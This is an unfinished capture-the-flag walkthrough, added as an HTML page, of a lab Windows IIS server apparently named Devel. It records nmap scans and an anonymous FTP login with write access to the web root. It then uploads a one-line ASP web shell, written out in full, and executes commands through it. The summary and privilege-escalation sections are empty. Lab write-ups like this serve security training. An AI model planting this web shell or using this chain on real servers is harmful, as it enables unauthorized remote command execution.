@@ -1,0 +1,81 @@
+---
+layout: default
+---
+<html>
+<head>
+    <title>??? Walkthrough</title>
+    <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
+</head>
+
+<body>
+
+    <h1>??? Walkthrough</h1>
+
+    <hr>
+
+    <h2>Contents</h2>
+    <ul>
+        <li><a href="#summary">Summary</a></li>
+        <li><a href="#portscan">Port Scanning</a></li>
+        <li><a href="#infogather">Information Gathering</a></li>
+        <li><a href="#iis_apppool\web">Shell - iis apppool\web</a></li>
+        <li><a href="#root">Shell - root</a></li>
+    </ul>
+
+    <h2><a id="summary">Summary</a></h2>
+
+    <p></p>
+
+    <h2><a id="portscan">Port Scanning</a></h2>
+
+    <li>Running a port scan against the full port range to determine which ones are open.</li>
+
+    <pre>&#13;&#10;# Nmap 7.91 scan initiated Wed Oct 13 12:35:00 2021 as: nmap -p- -oN ping_tcp 10.129.235.238&#13;&#10;Nmap scan report for 10.129.235.238&#13;&#10;Host is up (0.042s latency).&#13;&#10;Not shown: 65533 filtered ports&#13;&#10;PORT   STATE SERVICE&#13;&#10;21/tcp open  ftp&#13;&#10;80/tcp open  http&#13;&#10;&#13;&#10;# Nmap done at Wed Oct 13 12:36:54 2021 -- 1 IP address (1 host up) scanned in 113.72 seconds&#13;&#10;    </pre>
+
+    <li>Running an nmap scan using the flags -sV and -sC to enumerate service versions and other information.</li>
+
+    <pre>&#13;&#10;# Nmap 7.91 scan initiated Wed Oct 13 12:37:11 2021 as: nmap -p21,80 -sV -sC -oN script_tcp 10.129.235.238&#13;&#10;Nmap scan report for 10.129.235.238&#13;&#10;Host is up (0.041s latency).&#13;&#10;&#13;&#10;PORT   STATE SERVICE VERSION&#13;&#10;21/tcp open  ftp     Microsoft ftpd&#13;&#10;| ftp-anon: Anonymous FTP login allowed (FTP code 230)&#13;&#10;| 03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client&#13;&#10;| 03-17-17  05:37PM                  689 iisstart.htm&#13;&#10;|_03-17-17  05:37PM               184946 welcome.png&#13;&#10;| ftp-syst: &#13;&#10;|_  SYST: Windows_NT&#13;&#10;80/tcp open  http    Microsoft IIS httpd 7.5&#13;&#10;| http-methods: &#13;&#10;|_  Potentially risky methods: TRACE&#13;&#10;|_http-server-header: Microsoft-IIS/7.5&#13;&#10;|_http-title: IIS7&#13;&#10;Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows&#13;&#10;&#13;&#10;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&#13;&#10;# Nmap done at Wed Oct 13 12:37:26 2021 -- 1 IP address (1 host up) scanned in 14.64 seconds&#13;&#10;    </pre>
+
+    <br>
+    <h2><a id="infogather">Information Gathering</a></h2>
+
+    <li>I begin with taking a look at the website on port 80.</li>
+
+    <img src="../images/devel/port80.png">
+
+    <li>It appears to be a default splash screen for IIS7.  Nothing else interesting stands out from this page so I move to ftp on port 21.  I attempt logging in with the credentials anonymous:anonymous ad it works.</li>
+
+    <pre>&#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Devel]&#13;&#10;&boxur;&HorizontalLine;$ ftp 10.129.221.155&#13;&#10;Connected to 10.129.221.155.&#13;&#10;220 Microsoft FTP Service&#13;&#10;Name (10.129.221.155:kali): anonymous&#13;&#10;534 Local policy on server does not allow TLS secure connections.&#13;&#10;534 Local policy on server does not allow TLS secure connections.&#13;&#10;SSL not available&#13;&#10;331 Anonymous access allowed, send identity (e-mail name) as password.&#13;&#10;Password:&#13;&#10;230 User logged in.&#13;&#10;Remote system type is Windows_NT.&#13;&#10;ftp&gt; ls&#13;&#10;200 PORT command successful.&#13;&#10;125 Data connection already open; Transfer starting.&#13;&#10;03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client&#13;&#10;03-17-17  05:37PM                  689 iisstart.htm&#13;&#10;03-17-17  05:37PM               184946 welcome.png&#13;&#10;226 Transfer complete.&#13;&#10;ftp&gt; &#13;&#10;    </pre>
+
+    <li>It appears we have FTP access to the web servers root directory.  Now I will test to see if we can write to the server.</li>
+
+    <pre>&#13;&#10;ftp&gt; put test.txt &#13;&#10;local: test.txt remote: test.txt&#13;&#10;200 PORT command successful.&#13;&#10;125 Data connection already open; Transfer starting.&#13;&#10;226 Transfer complete.&#13;&#10;12 bytes sent in 0.00 secs (195.3125 kB/s)&#13;&#10;ftp&gt; &#13;&#10;    </pre>
+
+    <li>It allowed me to upload my text.txt file, so we know we have write access.  The test.txt file only contains the text "testing123".  Now I go to the website and see if I can access this page.</li>
+
+    <img src="../images/devel/test.png">
+
+    <br>
+    <h2><a id="iis_apppool\web">Shell - iis apppool\web</a></h2>
+
+    <li>I have now confirmed that we are able to upload files to the web server and access them.  This time I will upload a web shell.  It is an IIS server so I will use an asp webshell.  aspx would probably would work.</li>
+
+    <pre>&#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Devel]&#13;&#10;&boxur;&HorizontalLine;$ cat shell.asp      &#13;&#10;&lt;%response.write CreateObject(&quot;WScript.Shell&quot;).Exec(Request.QueryString(&quot;cmd&quot;)).StdOut.Readall()%&gt;&#13;&#10;    </pre>
+
+    <li>Now I upload it using ftp</li>
+
+    <pre>&#13;&#10;ftp&gt; put shell.asp&#13;&#10;local: shell.asp remote: shell.asp&#13;&#10;200 PORT command successful.&#13;&#10;125 Data connection already open; Transfer starting.&#13;&#10;226 Transfer complete.&#13;&#10;100 bytes sent in 0.00 secs (1.7340 MB/s)&#13;&#10;ftp&gt; &#13;&#10;    </pre>
+
+    <li>Now I access it using firefox.  Initially I tried the command "whoami" but the web shell was not outputting any information.  However, when I added cmd /c in front of whoami it did successfuly run the command.</li>
+
+    <img src="../images/devel/whoami.png">
+
+    <li></li>
+
+
+    <br>
+    <h2><a id="root">Shell - Root</a></h2>
+
+</body>
+</html>
+
